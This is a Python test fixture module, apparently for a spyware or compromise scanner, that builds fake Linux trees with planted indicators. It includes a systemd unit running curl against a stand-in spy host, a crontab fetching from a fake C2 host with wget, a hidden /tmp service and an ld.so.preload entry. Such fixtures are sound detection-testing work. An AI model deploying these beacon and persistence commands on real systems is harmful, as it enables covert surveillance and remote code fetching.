"""Builds throwaway fixture trees and IOC dirs. Everything here is fake test data."""
from __future__ import annotations

import hashlib
import json
import os
import plistlib
import sqlite3
import tempfile
from pathlib import Path

FIX = Path(__file__).parent / "fixtures"
FAKE_BINARY = b"#!/bin/sh\n# harmless fixture standing in for a 'known bad' binary\nexit 0\n"
FAKE_SHA = hashlib.sha256(FAKE_BINARY).hexdigest()


def make_ioc_dir(tmp: Path) -> Path:
    d = tmp / "iocs"
    d.mkdir()
    data = (FIX / "fake_iocs.stix2").read_text().replace("__FIXTURE_SHA256__", FAKE_SHA).encode()
    (d / "fake.stix2").write_bytes(data)
    manifest = {"files": [{"name": "FAKE TEST IOCS", "url": "https://example.invalid/fake.stix2",
                           "file": "fake.stix2", "sha256": hashlib.sha256(data).hexdigest(),
                           "fetched_at": "2026-10-28T12:00:00+00:00", "indicator_count": 9}]}
    (d / "manifest.json").write_text(json.dumps(manifest))
    return d


def chrome_history(path: Path, urls: list[tuple[str, int]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    con = sqlite3.connect(path)
    con.execute("CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, visit_count INTEGER)")
    con.executemany("INSERT INTO urls (url, visit_count) VALUES (?, ?)", urls)
    con.commit()
    con.close()


def safari_history(path: Path, urls: list[tuple[str, int]]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    con = sqlite3.connect(path)
    con.execute("CREATE TABLE history_items (id INTEGER PRIMARY KEY, url TEXT, visit_count INTEGER)")
    con.executemany("INSERT INTO history_items (url, visit_count) VALUES (?, ?)", urls)
    con.commit()
    con.close()


def w(path: Path, text: str | bytes) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    (path.write_bytes if isinstance(text, bytes) else path.write_text)(text)
    return path


def linux_tree(root: Path, home: str = "/home/alice") -> None:
    proc = root / "proc"
    for pid, comm, exe in [(101, "bash", "/usr/bin/bash"), (202, "fakespyd", "/opt/sneaky/fakespyd"),
                           (303, "diagnosticd", "/usr/libexec/diagnosticd"), (404, "updater", "/opt/app/updater")]:
        w(proc / str(pid) / "comm", comm + "\n")
        w(proc / str(pid) / "exe_path", exe)
    w(root / "opt/app/updater", FAKE_BINARY)           # hash IOC hit
    w(root / "etc/systemd/system/good.service", "[Service]\nExecStart=/usr/bin/sshd -D\n")
    w(root / "etc/systemd/system/tmp.service", "[Service]\nExecStart=/tmp/.hidden/run --quiet\n")
    w(root / "etc/systemd/system/beacon.service",
      "[Service]\nExecStart=/usr/bin/curl -s https://evil-spy.example/ping\n")
    w(root / "etc/crontab", "SHELL=/bin/sh\n*/5 * * * * root /usr/bin/wget http://c2.bad-tracker.example/x\n")
    w(root / home.lstrip("/") / ".config/autostart/x.desktop",
      "[Desktop Entry]\nName=X\nExec=/home/alice/.local/bin/fakespyd --bg\n")
    w(root / "etc/ld.so.preload", "/usr/lib/libsneaky.so\n")
    chrome_history(root / home.lstrip("/") / ".config/google-chrome/Default/History",
                   [("https://www.wikipedia.org/", 3), ("https://login.evil-spy.example/a", 2),
                    ("https://deep.sub.wild.example/", 1)])


def snapshot(root: Path) -> dict:
    out = {}
    for dp, dn, fn in os.walk(root):
        for f in fn + dn:
            p = Path(dp) / f
            st = p.lstat()
            out[str(p)] = (st.st_size, st.st_mtime_ns,
                           hashlib.sha256(p.read_bytes()).hexdigest() if p.is_file() else None)
    return out


def fake_runner(table: dict):
    """table: {tuple(argv): (rc, stdout)}; prefix match on the longest key."""
    calls = []

    def run(argv):
        calls.append(list(argv))
        best = None
        for k in table:
            if tuple(argv[: len(k)]) == k and (best is None or len(k) > len(best)):
                best = k
        if best is None:
            return 1, "", "not faked"
        rc, out = table[best]
        return rc, out, ""
    run.calls = calls
    return run


def tmpdir() -> tempfile.TemporaryDirectory:
    return tempfile.TemporaryDirectory(prefix="rocs-test-")
